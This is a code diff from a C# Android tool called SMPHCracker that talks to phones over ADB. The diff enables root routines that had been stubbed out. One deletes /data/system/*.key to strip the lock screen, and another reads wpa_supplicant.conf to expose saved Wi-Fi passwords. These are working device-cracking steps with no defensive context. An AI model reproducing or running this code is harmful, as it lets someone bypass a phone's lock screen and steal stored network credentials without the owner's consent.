@@ -15,6 +15,7 @@ namespace SMPHCracker.Logic
         {
             String output = ADB.Execute(ADBCommands.DEVICES);
 
+            //TODO - use LINQ to cut out -> device || unauthorized || recovery || sideload
             output = String.IsNullOrWhiteSpace(output) ? String.Empty : string.Join(" ", Regex.Split(output, @"(?:\r\n|\n|\r|\t)")).Split(' ')[5];
 
             switch (output)
@@ -23,8 +24,7 @@ namespace SMPHCracker.Logic
                     return Status.Unauthorized;
 
                 case "device":
-                    //TODO - change to ADB.Execute(SHELLROOT) after SHELL-ROOT fix
-                    output = ADB.Shell("TestSu", true);
+                    output = ADB.Execute(ADBCommands.SHELLROOT); 
 
                     if(output.Contains("error") || output.Contains("denied"))
                         return Status.ADB;
@@ -52,8 +52,6 @@ namespace SMPHCracker.Logic
             switch (status)
             {
                 case Status.Root:
-                    //TODO - FIX SHELL-ROOT!
-                    return false;
                     ADB.Execute(ADBCommands.SHELLROOT, "mount data");
                     //Remove LockScreen
                     ADB.Execute(ADBCommands.SHELLROOT, "rm /data/system/*.key");
@@ -140,8 +138,6 @@ namespace SMPHCracker.Logic
             switch (status)
             {
                 case Status.Root:
-                    //TODO - FIX SHELL-SU!
-                    return "false";
                     //Show WLAN-Keys
                     return ADB.Execute(ADBCommands.SHELLROOT, "cat /data/misc/wifi/wpa_supplicant.conf");
 
